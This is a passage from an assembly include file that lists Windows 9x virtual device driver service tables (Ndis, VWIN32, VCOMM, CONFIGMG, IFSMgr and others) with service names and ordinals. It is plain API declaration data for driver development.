  PageFile_Service PageFile_Init_File                       ; 0x0001 ord
  PageFile_Service PageFile_Clean_Up                        ; 0x0002 ord
  PageFile_Service PageFile_Grow_File                       ; 0x0003 ord
  PageFile_Service PageFile_Read_Or_Write                   ; 0x0004 ord
  PageFile_Service PageFile_Cancel                          ; 0x0005 ord
  PageFile_Service PageFile_Test_IO_Valid                   ; 0x0006 ord
  PageFile_Service PageFile_Get_Size_Info                   ; 0x0007 ord
  PageFile_Service PageFile_Set_Async_Manager               ; 0x0008 ord
  PageFile_Service PageFile_Call_Async_Manager              ; 0x0009 ord
End_Service_Table PageFile

Begin_Service_Table SCSI	; 0x0022
End_Service_Table SCSI

Begin_Service_Table SCSIFD	; 0x0024
End_Service_Table SCSIFD

Begin_Service_Table VPEND	; 0x0025
End_Service_Table VPEND

Begin_Service_Table APM	; 0x0026
End_Service_Table APM

Begin_Service_Table VXDLDR	; 0x0027
  VXDLDR_Service VXDLDR_GetVersion                        ; 0x0000 ord
  VXDLDR_Service VXDLDR_LoadDevice                        ; 0x0001 ord
  VXDLDR_Service VXDLDR_UnloadDevice                      ; 0x0002 ord
  VXDLDR_Service VXDLDR_DevInitSucceeded                  ; 0x0003 ord
  VXDLDR_Service VXDLDR_DevInitFailed                     ; 0x0004 ord
  VXDLDR_Service VXDLDR_GetDeviceList                     ; 0x0005 ord
  VXDLDR_Service VXDLDR_UnloadMe                          ; 0x0006 ord
  VXDLDR_Service _PELDR_LoadModule                        ; 0x0007 ord
  VXDLDR_Service _PELDR_GetModuleHandle                   ; 0x0008 ord
  VXDLDR_Service _PELDR_GetModuleUsage                    ; 0x0009 ord
  VXDLDR_Service _PELDR_GetEntryPoint                     ; 0x000a ord
  VXDLDR_Service _PELDR_GetProcAddress                    ; 0x000b ord
  VXDLDR_Service _PELDR_AddExportTable                    ; 0x000c ord
  VXDLDR_Service _PELDR_RemoveExportTable                 ; 0x000d ord
  VXDLDR_Service _PELDR_FreeModule                        ; 0x000e ord
  VXDLDR_Service VXDLDR_Notify                            ; 0x000f ord
  VXDLDR_Service _PELDR_InitCompleted                     ; 0x0010 ord
  VXDLDR_Service _PELDR_LoadModuleEx                      ; 0x0011 ord
  VXDLDR_Service _PELDR_LoadModule2                       ; 0x0012 ord
End_Service_Table VXDLDR

Begin_Service_Table Ndis	; 0x0028
  Ndis_Service NdisGetVersion                           ; 0x0000 ord
  Ndis_Service NdisAllocateSpinLock                     ; 0x0001 ord
  Ndis_Service NdisFreeSpinLock                         ; 0x0002 ord
  Ndis_Service NdisAcquireSpinLock                      ; 0x0003 ord
  Ndis_Service NdisReleaseSpinLock                      ; 0x0004 ord
  Ndis_Service NdisOpenConfiguration                    ; 0x0005 ord
  Ndis_Service NdisReadConfiguration                    ; 0x0006 ord
  Ndis_Service NdisCloseConfiguration                   ; 0x0007 ord
  Ndis_Service NdisReadEisaSlotInformation              ; 0x0008 ord
  Ndis_Service NdisReadMcaPosInformation                ; 0x0009 ord
  Ndis_Service NdisAllocateMemory                       ; 0x000a ord
  Ndis_Service NdisFreeMemory                           ; 0x000b ord
  Ndis_Service NdisSetTimer                             ; 0x000c ord
  Ndis_Service NdisCancelTimer                          ; 0x000d ord
  Ndis_Service NdisStallExecution                       ; 0x000e ord
  Ndis_Service NdisInitializeInterrupt                  ; 0x000f ord
  Ndis_Service NdisRemoveInterrupt                      ; 0x0010 ord
  Ndis_Service NdisSynchronizeWithInterrupt             ; 0x0011 ord
  Ndis_Service NdisOpenFile                             ; 0x0012 ord
  Ndis_Service NdisMapFile                              ; 0x0013 ord
  Ndis_Service NdisUnmapFile                            ; 0x0014 ord
  Ndis_Service NdisCloseFile                            ; 0x0015 ord
  Ndis_Service NdisAllocatePacketPool                   ; 0x0016 ord
  Ndis_Service NdisFreePacketPool                       ; 0x0017 ord
  Ndis_Service NdisAllocatePacket                       ; 0x0018 ord
  Ndis_Service NdisReinitializePacket                   ; 0x0019 ord
  Ndis_Service NdisFreePacket                           ; 0x001a ord
  Ndis_Service NdisQueryPacket                          ; 0x001b ord
  Ndis_Service NdisAllocateBufferPool                   ; 0x001c ord
  Ndis_Service NdisFreeBufferPool                       ; 0x001d ord
  Ndis_Service NdisAllocateBuffer                       ; 0x001e ord
  Ndis_Service NdisCopyBuffer                           ; 0x001f ord
  Ndis_Service NdisFreeBuffer                           ; 0x0020 ord
  Ndis_Service NdisQueryBuffer                          ; 0x0021 ord
  Ndis_Service NdisGetBufferPhysicalAddress             ; 0x0022 ord
  Ndis_Service NdisChainBufferAtFront                   ; 0x0023 ord
  Ndis_Service NdisChainBufferAtBack                    ; 0x0024 ord
  Ndis_Service NdisUnchainBufferAtFront                 ; 0x0025 ord
  Ndis_Service NdisUnchainBufferAtBack                  ; 0x0026 ord
  Ndis_Service NdisGetNextBuffer                        ; 0x0027 ord
  Ndis_Service NdisCopyFromPacketToPacket               ; 0x0028 ord
  Ndis_Service NdisRegisterProtocol                     ; 0x0029 ord
  Ndis_Service NdisDeregisterProtocol                   ; 0x002a ord
  Ndis_Service NdisOpenAdapter                          ; 0x002b ord
  Ndis_Service NdisCloseAdapter                         ; 0x002c ord
  Ndis_Service NdisSend                                 ; 0x002d ord
  Ndis_Service NdisTransferData                         ; 0x002e ord
  Ndis_Service NdisReset                                ; 0x002f ord
  Ndis_Service NdisRequest                              ; 0x0030 ord
  Ndis_Service NdisInitializeWrapper                    ; 0x0031 ord
  Ndis_Service NdisTerminateWrapper                     ; 0x0032 ord
  Ndis_Service NdisRegisterMac                          ; 0x0033 ord
  Ndis_Service NdisDeregisterMac                        ; 0x0034 ord
  Ndis_Service NdisRegisterAdapter                      ; 0x0035 ord
  Ndis_Service NdisDeregisterAdapter                    ; 0x0036 ord
  Ndis_Service NdisCompleteOpenAdapter                  ; 0x0037 ord
  Ndis_Service NdisCompleteCloseAdapter                 ; 0x0038 ord
  Ndis_Service NdisCompleteSend                         ; 0x0039 ord
  Ndis_Service NdisCompleteTransferData                 ; 0x003a ord
  Ndis_Service NdisCompleteReset                        ; 0x003b ord
  Ndis_Service NdisCompleteRequest                      ; 0x003c ord
  Ndis_Service NdisIndicateReceive                      ; 0x003d ord
  Ndis_Service NdisIndicateReceiveComplete              ; 0x003e ord
  Ndis_Service NdisIndicateStatus                       ; 0x003f ord
  Ndis_Service NdisIndicateStatusComplete               ; 0x0040 ord
  Ndis_Service NdisCompleteQueryStatistics              ; 0x0041 ord
  Ndis_Service NdisEqualString                          ; 0x0042 ord
  Ndis_Service NdisRegAdaptShutdown                     ; 0x0043 ord
  Ndis_Service NdisReadNetworkAddress                   ; 0x0044 ord
  Ndis_Service NdisWriteErrorLogEntry                   ; 0x0045 ord
  Ndis_Service NdisMapIoSpace                           ; 0x0046 ord
  Ndis_Service NdisDeregAdaptShutdown                   ; 0x0047 ord
  Ndis_Service NdisAllocateSharedMemory                 ; 0x0048 ord
  Ndis_Service NdisFreeSharedMemory                     ; 0x0049 ord
  Ndis_Service NdisAllocateDmaChannel                   ; 0x004a ord
  Ndis_Service NdisSetupDmaTransfer                     ; 0x004b ord
  Ndis_Service NdisCompleteDmaTransfer                  ; 0x004c ord
  Ndis_Service NdisReadDmaCounter                       ; 0x004d ord
  Ndis_Service NdisFreeDmaChannel                       ; 0x004e ord
  Ndis_Service NdisReleaseAdapterResources              ; 0x004f ord
  Ndis_Service NdisQueryGlobalStatistics                ; 0x0050 ord
  Ndis_Service NdisOpenProtocolConfiguration            ; 0x0051 ord
  Ndis_Service NdisCompleteBindAdapter                  ; 0x0052 ord
  Ndis_Service NdisCompleteUnbindAdapter                ; 0x0053 ord
  Ndis_Service WrapperStartNet                          ; 0x0054 ord
  Ndis_Service WrapperGetComponentList                  ; 0x0055 ord
  Ndis_Service WrapperQueryAdapterResources             ; 0x0056 ord
  Ndis_Service WrapperDelayBinding                      ; 0x0057 ord
  Ndis_Service WrapperResumeBinding                     ; 0x0058 ord
  Ndis_Service WrapperRemoveChildren                    ; 0x0059 ord
  Ndis_Service NdisImmediateReadPciSlotInformation      ; 0x005a ord
  Ndis_Service NdisImmediateWritePciSlotInformation     ; 0x005b ord
  Ndis_Service NdisReadPciSlotInformation               ; 0x005c ord
  Ndis_Service NdisWritePciSlotInformation              ; 0x005d ord
  Ndis_Service NdisPciAssignResources                   ; 0x005e ord
  Ndis_Service NdisQueryBufferOffset                    ; 0x005f ord
  Ndis_Service NdisMWanSend                             ; 0x0060 ord
  Ndis_Service DbgPrint                                 ; 0x0061 ord
  Ndis_Service NdisInitializeEvent                      ; 0x0062 ord
  Ndis_Service NdisSetEvent                             ; 0x0063 ord
  Ndis_Service NdisResetEvent                           ; 0x0064 ord
  Ndis_Service NdisWaitEvent                            ; 0x0065 ord
End_Service_Table Ndis

Begin_Service_Table VWIN32	; 0x002a
  VWIN32_Service VWIN32_Get_Version                       ; 0x0000 ord
  VWIN32_Service VWIN32_DIOCCompletionRoutine             ; 0x0001 ord
  VWIN32_Service _VWIN32_QueueUserApc                     ; 0x0002 ord
  VWIN32_Service _VWIN32_Get_Thread_Context               ; 0x0003 ord
  VWIN32_Service _VWIN32_Set_Thread_Context               ; 0x0004 ord
  VWIN32_Service _VWIN32_CopyMem                          ; 0x0005 ord
  VWIN32_Service _VWIN32_Npx_Exception                    ; 0x0006 ord
  VWIN32_Service _VWIN32_Emulate_Npx                      ; 0x0007 ord
  VWIN32_Service _VWIN32_CheckDelayedNpxTrap              ; 0x0008 ord
  VWIN32_Service VWIN32_EnterCrstR0                       ; 0x0009 ord
  VWIN32_Service VWIN32_LeaveCrstR0                       ; 0x000a ord
  VWIN32_Service _VWIN32_FaultPopup                       ; 0x000b ord
  VWIN32_Service VWIN32_GetContextHandle                  ; 0x000c ord
  VWIN32_Service VWIN32_GetCurrentProcessHandle           ; 0x000d ord
  VWIN32_Service _VWIN32_SetWin32Event                    ; 0x000e ord
  VWIN32_Service _VWIN32_PulseWin32Event                  ; 0x000f ord
  VWIN32_Service _VWIN32_ResetWin32Event                  ; 0x0010 ord
  VWIN32_Service _VWIN32_WaitSingleObject                 ; 0x0011 ord
  VWIN32_Service _VWIN32_WaitMultipleObjects              ; 0x0012 ord
  VWIN32_Service _VWIN32_CreateRing0Thread                ; 0x0013 ord
  VWIN32_Service _VWIN32_CloseVxDHandle                   ; 0x0014 ord
  VWIN32_Service VWIN32_ActiveTimeBiasSet                 ; 0x0015 ord
  VWIN32_Service VWIN32_GetCurrentDirectory               ; 0x0016 ord
  VWIN32_Service VWIN32_BlueScreenPopup                   ; 0x0017 ord
  VWIN32_Service VWIN32_TerminateApp                      ; 0x0018 ord
  VWIN32_Service _VWIN32_QueueKernelAPC                   ; 0x0019 ord
  VWIN32_Service VWIN32_SysErrorBox                       ; 0x001a ord
  VWIN32_Service _VWIN32_IsClientWin32                    ; 0x001b ord
  VWIN32_Service VWIN32_IFSRIPWhenLev2Taken               ; 0x001c ord
; win95 services end here
  VWIN32_Service _VWIN32_InitWin32Event                   ; 0x001d ord
  VWIN32_Service _VWIN32_InitWin32Mutex                   ; 0x001e ord
  VWIN32_Service _VWIN32_ReleaseWin32Mutex                ; 0x001f ord
  VWIN32_Service _VWIN32_BlockThreadEx                    ; 0x0020 ord
  VWIN32_Service VWIN32_GetProcessHandle                  ; 0x0021 ord
  VWIN32_Service _VWIN32_InitWin32Semaphore               ; 0x0022 ord
  VWIN32_Service _VWIN32_SignalWin32Sem                   ; 0x0023 ord
  VWIN32_Service _VWIN32_QueueUserApcEx                   ; 0x0024 ord
  VWIN32_Service _VWIN32_OpenVxDHandle                    ; 0x0025 ord
  VWIN32_Service _VWIN32_CloseWin32Handle                 ; 0x0026 ord
  VWIN32_Service _VWIN32_AllocExternalHandle              ; 0x0027 ord
  VWIN32_Service _VWIN32_UseExternalHandle                ; 0x0028 ord
  VWIN32_Service _VWIN32_UnuseExternalHandle              ; 0x0029 ord
  VWIN32_Service KeInitializeTimer                        ; 0x002a ord
  VWIN32_Service KeSetTimer                               ; 0x002b ord
  VWIN32_Service KeCancelTimer                            ; 0x002c ord
  VWIN32_Service KeReadStateTimer                         ; 0x002d ord
  VWIN32_Service _VWIN32_ReferenceObject                  ; 0x002e ord
  VWIN32_Service _VWIN32_GetExternalHandle                ; 0x002f ord
  VWIN32_Service VWIN32_ConvertNtTimeout                  ; 0x0030 ord
  VWIN32_Service _VWIN32_SetWin32EventBoostPriority       ; 0x0031 ord
  VWIN32_Service _VWIN32_GetRing3Flat32Selectors          ; 0x0032 ord
  VWIN32_Service _VWIN32_GetCurThreadCondition            ; 0x0033 ord
  VWIN32_Service VWIN32_Init_FP                           ; 0x0034 ord
  VWIN32_Service R0SetWaitableTimer                       ; 0x0035 ord
End_Service_Table VWIN32

Begin_Service_Table VCOMM	; 0x002b
  VCOMM_Service VCOMM_Get_Version                        ; 0x0000 ord
  VCOMM_Service _VCOMM_Register_Port_Driver              ; 0x0001 ord
  VCOMM_Service _VCOMM_Acquire_Port                      ; 0x0002 ord
  VCOMM_Service _VCOMM_Release_Port                      ; 0x0003 ord
  VCOMM_Service _VCOMM_OpenComm                          ; 0x0004 ord
  VCOMM_Service _VCOMM_SetCommState                      ; 0x0005 ord
  VCOMM_Service _VCOMM_GetCommState                      ; 0x0006 ord
  VCOMM_Service _VCOMM_SetupComm                         ; 0x0007 ord
  VCOMM_Service _VCOMM_TransmitCommChar                  ; 0x0008 ord
  VCOMM_Service _VCOMM_CloseComm                         ; 0x0009 ord
  VCOMM_Service _VCOMM_GetCommQueueStatus                ; 0x000a ord
  VCOMM_Service _VCOMM_ClearCommError                    ; 0x000b ord
  VCOMM_Service _VCOMM_GetModemStatus                    ; 0x000c ord
  VCOMM_Service _VCOMM_GetCommProperties                 ; 0x000d ord
  VCOMM_Service _VCOMM_EscapeCommFunction                ; 0x000e ord
  VCOMM_Service _VCOMM_PurgeComm                         ; 0x000f ord
  VCOMM_Service _VCOMM_SetCommEventMask                  ; 0x0010 ord
  VCOMM_Service _VCOMM_GetCommEventMask                  ; 0x0011 ord
  VCOMM_Service _VCOMM_WriteComm                         ; 0x0012 ord
  VCOMM_Service _VCOMM_ReadComm                          ; 0x0013 ord
  VCOMM_Service _VCOMM_EnableCommNotification            ; 0x0014 ord
  VCOMM_Service _VCOMM_GetLastError                      ; 0x0015 ord
  VCOMM_Service _VCOMM_Steal_Port                        ; 0x0016 ord
  VCOMM_Service _VCOMM_SetReadCallBack                   ; 0x0017 ord
  VCOMM_Service _VCOMM_SetWriteCallBack                  ; 0x0018 ord
  VCOMM_Service _VCOMM_Add_Port                          ; 0x0019 ord
  VCOMM_Service _VCOMM_GetSetCommTimeouts                ; 0x001a ord
  VCOMM_Service _VCOMM_SetWriteRequest                   ; 0x001b ord
  VCOMM_Service _VCOMM_SetReadRequest                    ; 0x001c ord
  VCOMM_Service _VCOMM_Dequeue_Request                   ; 0x001d ord
  VCOMM_Service _VCOMM_Enumerate_DevNodes                ; 0x001e ord
  VCOMM_Service VCOMM_Map_Win32DCB_To_Ring0              ; 0x001f ord
  VCOMM_Service VCOMM_Map_Ring0DCB_To_Win32              ; 0x0020 ord
  VCOMM_Service _VCOMM_Get_Contention_Handler            ; 0x0021 ord
  VCOMM_Service _VCOMM_Map_Name_To_Resource              ; 0x0022 ord
  VCOMM_Service _VCOMM_PowerOnOffComm                    ; 0x0023 ord
End_Service_Table VCOMM

Begin_Service_Table SPOOLER	; 0x002c
End_Service_Table SPOOLER

Begin_Service_Table WIN32S	; 0x002d
End_Service_Table WIN32S

Begin_Service_Table DEBUGCMD	; 0x002e
End_Service_Table DEBUGCMD

Begin_Service_Table CONFIGMG	; 0x0033
  CONFIGMG_Service _CONFIGMG_Get_Version                    ; 0x0000 ord
  CONFIGMG_Service _CONFIGMG_Initialize                     ; 0x0001 ord
  CONFIGMG_Service _CONFIGMG_Locate_DevNode                 ; 0x0002 ord
  CONFIGMG_Service _CONFIGMG_Get_Parent                     ; 0x0003 ord
  CONFIGMG_Service _CONFIGMG_Get_Child                      ; 0x0004 ord
  CONFIGMG_Service _CONFIGMG_Get_Sibling                    ; 0x0005 ord
  CONFIGMG_Service _CONFIGMG_Get_Device_ID_Size             ; 0x0006 ord
  CONFIGMG_Service _CONFIGMG_Get_Device_ID                  ; 0x0007 ord
  CONFIGMG_Service _CONFIGMG_Get_Depth                      ; 0x0008 ord
  CONFIGMG_Service _CONFIGMG_Get_Private_DWord              ; 0x0009 ord
  CONFIGMG_Service _CONFIGMG_Set_Private_DWord              ; 0x000a ord
  CONFIGMG_Service _CONFIGMG_Create_DevNode                 ; 0x000b ord
  CONFIGMG_Service _CONFIGMG_Query_Remove_SubTree           ; 0x000c ord
  CONFIGMG_Service _CONFIGMG_Remove_SubTree                 ; 0x000d ord
  CONFIGMG_Service _CONFIGMG_Register_Device_Driver         ; 0x000e ord
  CONFIGMG_Service _CONFIGMG_Register_Enumerator            ; 0x000f ord
  CONFIGMG_Service _CONFIGMG_Register_Arbitrator            ; 0x0010 ord
  CONFIGMG_Service _CONFIGMG_Deregister_Arbitrator          ; 0x0011 ord
  CONFIGMG_Service _CONFIGMG_Query_Arbitrator_Free_Size     ; 0x0012 ord
  CONFIGMG_Service _CONFIGMG_Query_Arbitrator_Free_Data     ; 0x0013 ord
  CONFIGMG_Service _CONFIGMG_Sort_NodeList                  ; 0x0014 ord
  CONFIGMG_Service _CONFIGMG_Yield                          ; 0x0015 ord
  CONFIGMG_Service _CONFIGMG_Lock                           ; 0x0016 ord
  CONFIGMG_Service _CONFIGMG_Unlock                         ; 0x0017 ord
  CONFIGMG_Service _CONFIGMG_Add_Empty_Log_Conf             ; 0x0018 ord
  CONFIGMG_Service _CONFIGMG_Free_Log_Conf                  ; 0x0019 ord
  CONFIGMG_Service _CONFIGMG_Get_First_Log_Conf             ; 0x001a ord
  CONFIGMG_Service _CONFIGMG_Get_Next_Log_Conf              ; 0x001b ord
  CONFIGMG_Service _CONFIGMG_Add_Res_Des                    ; 0x001c ord
  CONFIGMG_Service _CONFIGMG_Modify_Res_Des                 ; 0x001d ord
  CONFIGMG_Service _CONFIGMG_Free_Res_Des                   ; 0x001e ord
  CONFIGMG_Service _CONFIGMG_Get_Next_Res_Des               ; 0x001f ord
  CONFIGMG_Service _CONFIGMG_Get_Performance_Info           ; 0x0020 ord
  CONFIGMG_Service _CONFIGMG_Get_Res_Des_Data_Size          ; 0x0021 ord
  CONFIGMG_Service _CONFIGMG_Get_Res_Des_Data               ; 0x0022 ord
  CONFIGMG_Service _CONFIGMG_Process_Events_Now             ; 0x0023 ord
  CONFIGMG_Service _CONFIGMG_Create_Range_List              ; 0x0024 ord
  CONFIGMG_Service _CONFIGMG_Add_Range                      ; 0x0025 ord
  CONFIGMG_Service _CONFIGMG_Delete_Range                   ; 0x0026 ord
  CONFIGMG_Service _CONFIGMG_Test_Range_Available           ; 0x0027 ord
  CONFIGMG_Service _CONFIGMG_Dup_Range_List                 ; 0x0028 ord
  CONFIGMG_Service _CONFIGMG_Free_Range_List                ; 0x0029 ord
  CONFIGMG_Service _CONFIGMG_Invert_Range_List              ; 0x002a ord
  CONFIGMG_Service _CONFIGMG_Intersect_Range_List           ; 0x002b ord
  CONFIGMG_Service _CONFIGMG_First_Range                    ; 0x002c ord
  CONFIGMG_Service _CONFIGMG_Next_Range                     ; 0x002d ord
  CONFIGMG_Service _CONFIGMG_Dump_Range_List                ; 0x002e ord
  CONFIGMG_Service _CONFIGMG_Load_DLVxDs                    ; 0x002f ord
  CONFIGMG_Service _CONFIGMG_Get_DDBs                       ; 0x0030 ord
  CONFIGMG_Service _CONFIGMG_Get_CRC_CheckSum               ; 0x0031 ord
  CONFIGMG_Service _CONFIGMG_Register_DevLoader             ; 0x0032 ord
  CONFIGMG_Service _CONFIGMG_Reenumerate_DevNode            ; 0x0033 ord
  CONFIGMG_Service _CONFIGMG_Setup_DevNode                  ; 0x0034 ord
  CONFIGMG_Service _CONFIGMG_Reset_Children_Marks           ; 0x0035 ord
  CONFIGMG_Service _CONFIGMG_Get_DevNode_Status             ; 0x0036 ord
  CONFIGMG_Service _CONFIGMG_Remove_Unmarked_Children       ; 0x0037 ord
  CONFIGMG_Service _CONFIGMG_ISAPNP_To_CM                   ; 0x0038 ord
  CONFIGMG_Service _CONFIGMG_CallBack_Device_Driver         ; 0x0039 ord
  CONFIGMG_Service _CONFIGMG_CallBack_Enumerator            ; 0x003a ord
  CONFIGMG_Service _CONFIGMG_Get_Alloc_Log_Conf             ; 0x003b ord
  CONFIGMG_Service _CONFIGMG_Get_DevNode_Key_Size           ; 0x003c ord
  CONFIGMG_Service _CONFIGMG_Get_DevNode_Key                ; 0x003d ord
  CONFIGMG_Service _CONFIGMG_Read_Registry_Value            ; 0x003e ord
  CONFIGMG_Service _CONFIGMG_Write_Registry_Value           ; 0x003f ord
  CONFIGMG_Service _CONFIGMG_Disable_DevNode                ; 0x0040 ord
  CONFIGMG_Service _CONFIGMG_Enable_DevNode                 ; 0x0041 ord
  CONFIGMG_Service _CONFIGMG_Move_DevNode                   ; 0x0042 ord
  CONFIGMG_Service _CONFIGMG_Set_Bus_Info                   ; 0x0043 ord
  CONFIGMG_Service _CONFIGMG_Get_Bus_Info                   ; 0x0044 ord
  CONFIGMG_Service _CONFIGMG_Set_HW_Prof                    ; 0x0045 ord
  CONFIGMG_Service _CONFIGMG_Recompute_HW_Prof              ; 0x0046 ord
  CONFIGMG_Service _CONFIGMG_Query_Change_HW_Prof           ; 0x0047 ord
  CONFIGMG_Service _CONFIGMG_Get_Device_Driver_Private_DWord ; 0x0048 ord
  CONFIGMG_Service _CONFIGMG_Set_Device_Driver_Private_DWord ; 0x0049 ord
  CONFIGMG_Service _CONFIGMG_Get_HW_Prof_Flags              ; 0x004a ord
  CONFIGMG_Service _CONFIGMG_Set_HW_Prof_Flags              ; 0x004b ord
  CONFIGMG_Service _CONFIGMG_Read_Registry_Log_Confs        ; 0x004c ord
  CONFIGMG_Service _CONFIGMG_Run_Detection                  ; 0x004d ord
  CONFIGMG_Service _CONFIGMG_Call_At_Appy_Time              ; 0x004e ord
  CONFIGMG_Service _CONFIGMG_Fail_Change_HW_Prof            ; 0x004f ord
  CONFIGMG_Service _CONFIGMG_Set_Private_Problem            ; 0x0050 ord
  CONFIGMG_Service _CONFIGMG_Debug_DevNode                  ; 0x0051 ord
  CONFIGMG_Service _CONFIGMG_Get_Hardware_Profile_Info      ; 0x0052 ord
  CONFIGMG_Service _CONFIGMG_Register_Enumerator_Function   ; 0x0053 ord
  CONFIGMG_Service _CONFIGMG_Call_Enumerator_Function       ; 0x0054 ord
  CONFIGMG_Service _CONFIGMG_Add_ID                         ; 0x0055 ord
  CONFIGMG_Service _CONFIGMG_Find_Range                     ; 0x0056 ord
  CONFIGMG_Service _CONFIGMG_Get_Global_State               ; 0x0057 ord
  CONFIGMG_Service _CONFIGMG_Broadcast_Device_Change_Message ; 0x0058 ord
  CONFIGMG_Service _CONFIGMG_Call_DevNode_Handler           ; 0x0059 ord
  CONFIGMG_Service _CONFIGMG_Remove_Reinsert_All            ; 0x005a ord
  CONFIGMG_Service _CONFIGMG_Change_DevNode_Status          ; 0x005b ord
  CONFIGMG_Service _CONFIGMG_Reprocess_DevNode              ; 0x005c ord
  CONFIGMG_Service _CONFIGMG_Assert_Structure               ; 0x005d ord
  CONFIGMG_Service _CONFIGMG_Discard_Boot_Log_Conf          ; 0x005e ord
  CONFIGMG_Service _CONFIGMG_Set_Dependent_DevNode          ; 0x005f ord
  CONFIGMG_Service _CONFIGMG_Get_Dependent_DevNode          ; 0x0060 ord
  CONFIGMG_Service _CONFIGMG_Refilter_DevNode               ; 0x0061 ord
  CONFIGMG_Service _CONFIGMG_Merge_Range_List               ; 0x0062 ord
  CONFIGMG_Service _CONFIGMG_Substract_Range_List           ; 0x0063 ord
  CONFIGMG_Service _CONFIGMG_Set_DevNode_PowerState         ; 0x0064 ord
  CONFIGMG_Service _CONFIGMG_Get_DevNode_PowerState         ; 0x0065 ord
  CONFIGMG_Service _CONFIGMG_Set_DevNode_PowerCapabilities  ; 0x0066 ord
  CONFIGMG_Service _CONFIGMG_Get_DevNode_PowerCapabilities  ; 0x0067 ord
  CONFIGMG_Service _CONFIGMG_Read_Range_List                ; 0x0068 ord
  CONFIGMG_Service _CONFIGMG_Write_Range_List               ; 0x0069 ord
  CONFIGMG_Service _CONFIGMG_Get_Set_Log_Conf_Priority      ; 0x006a ord
  CONFIGMG_Service _CONFIGMG_Support_Share_Irq              ; 0x006b ord
  CONFIGMG_Service _CONFIGMG_Get_Parent_Structure           ; 0x006c ord
  CONFIGMG_Service _CONFIGMG_Register_DevNode_For_Idle_Detection ; 0x006d ord
  CONFIGMG_Service _CONFIGMG_CM_To_ISAPNP                   ; 0x006e ord
  CONFIGMG_Service _CONFIGMG_Get_DevNode_Handler            ; 0x006f ord
  CONFIGMG_Service _CONFIGMG_Detect_Resource_Conflict       ; 0x0070 ord
  CONFIGMG_Service _CONFIGMG_Get_Device_Interface_List      ; 0x0071 ord
  CONFIGMG_Service _CONFIGMG_Get_Device_Interface_List_Size ; 0x0072 ord
  CONFIGMG_Service _CONFIGMG_Get_Conflict_Info              ; 0x0073 ord
  CONFIGMG_Service _CONFIGMG_Add_Remove_DevNode_Property    ; 0x0074 ord
  CONFIGMG_Service _CONFIGMG_CallBack_At_Appy_Time          ; 0x0075 ord
  CONFIGMG_Service _CONFIGMG_Register_Device_Interface      ; 0x0076 ord
  CONFIGMG_Service _CONFIGMG_System_Device_Power_State_Mapping ; 0x0077 ord
  CONFIGMG_Service _CONFIGMG_Get_Arbitrator_Info            ; 0x0078 ord
  CONFIGMG_Service _CONFIGMG_Waking_Up_From_DevNode         ; 0x0079 ord
  CONFIGMG_Service _CONFIGMG_Set_DevNode_Problem            ; 0x007a ord
  CONFIGMG_Service _CONFIGMG_Get_Device_Interface_Alias     ; 0x007b ord
End_Service_Table CONFIGMG

Begin_Service_Table DWCFGMG	; 0x0034
End_Service_Table DWCFGMG

Begin_Service_Table SCSIPORT	; 0x0035
End_Service_Table SCSIPORT

Begin_Service_Table VFBACKUP	; 0x0036
  VFBACKUP_Service VFBACKUP_Get_Version                     ; 0x0000 ord
  VFBACKUP_Service VFBACKUP_Lock_NEC                        ; 0x0001 ord
  VFBACKUP_Service VFBACKUP_UnLock_NEC                      ; 0x0002 ord
  VFBACKUP_Service VFBACKUP_Register_NEC                    ; 0x0003 ord
  VFBACKUP_Service VFBACKUP_Register_VFD                    ; 0x0004 ord
  VFBACKUP_Service VFBACKUP_Lock_All_Ports                  ; 0x0005 ord
  VFBACKUP_Service _VFBACKUP_Set_Port_Mask                  ; 0x0006 ord
  VFBACKUP_Service _VFBACKUP_Register_Floppy                ; 0x0007 ord
  VFBACKUP_Service _VFBACKUP_Remove_Floppy                  ; 0x0008 ord
  VFBACKUP_Service VFBACKUP_UnRegister_NEC                  ; 0x0009 ord
End_Service_Table VFBACKUP

Begin_Service_Table ENABLE	; 0x0037
  ENABLE_Service VMINI_GetVersion                         ; 0x0000 ord
  ENABLE_Service VMINI_Update                             ; 0x0001 ord
  ENABLE_Service VMINI_Status                             ; 0x0002 ord
  ENABLE_Service VMINI_DisplayError                       ; 0x0003 ord
  ENABLE_Service VMINI_SetTimeStamp                       ; 0x0004 ord
  ENABLE_Service VMINI_Siren                              ; 0x0005 ord
  ENABLE_Service VMINI_RegisterAccess                     ; 0x0006 ord
  ENABLE_Service VMINI_GetData                            ; 0x0007 ord
  ENABLE_Service VMINI_ShutDownItem                       ; 0x0008 ord
  ENABLE_Service VMINI_RegisterSK                         ; 0x0009 ord
End_Service_Table ENABLE

Begin_Service_Table VCOND	; 0x0038
  VCOND_Service VCOND_Get_Version                        ; 0x0000 ord
  VCOND_Service VCOND_Launch_ConApp_Inherited            ; 0x0001 ord
  VCOND_Service VCOND_Get_ConsoleInfo                    ; 0x0002 ord
  VCOND_Service VCOND_GrbRepaintRect                     ; 0x0003 ord
  VCOND_Service VCOND_GrbSetCursorPosition               ; 0x0004 ord
  VCOND_Service VCOND_GrbNotifyWOA                       ; 0x0005 ord
End_Service_Table VCOND

Begin_Service_Table ISAPNP	; 0x003c
End_Service_Table ISAPNP

Begin_Service_Table BIOS	; 0x003d
End_Service_Table BIOS

Begin_Service_Table IFSMgr	; 0x0040
  IFSMgr_Service IFSMgr_Get_Version                       ; 0x0000 ord
  IFSMgr_Service IFSMgr_RegisterMount                     ; 0x0001 ord
  IFSMgr_Service IFSMgr_RegisterNet                       ; 0x0002 ord
  IFSMgr_Service IFSMgr_RegisterMailSlot                  ; 0x0003 ord
  IFSMgr_Service IFSMgr_Attach                            ; 0x0004 ord
  IFSMgr_Service IFSMgr_Detach                            ; 0x0005 ord
  IFSMgr_Service IFSMgr_Get_NetTime                       ; 0x0006 ord
  IFSMgr_Service IFSMgr_Get_DOSTime                       ; 0x0007 ord
  IFSMgr_Service IFSMgr_SetupConnection                   ; 0x0008 ord
  IFSMgr_Service IFSMgr_DerefConnection                   ; 0x0009 ord
  IFSMgr_Service IFSMgr_ServerDOSCall                     ; 0x000a ord
  IFSMgr_Service IFSMgr_CompleteAsync                     ; 0x000b ord
  IFSMgr_Service IFSMgr_RegisterHeap                      ; 0x000c ord
  IFSMgr_Service IFSMgr_GetHeap                           ; 0x000d ord
  IFSMgr_Service IFSMgr_RetHeap                           ; 0x000e ord
  IFSMgr_Service IFSMgr_CheckHeap                         ; 0x000f ord
  IFSMgr_Service IFSMgr_CheckHeapItem                     ; 0x0010 ord
  IFSMgr_Service IFSMgr_FillHeapSpare                     ; 0x0011 ord
  IFSMgr_Service IFSMgr_Block                             ; 0x0012 ord
  IFSMgr_Service IFSMgr_Wakeup                            ; 0x0013 ord
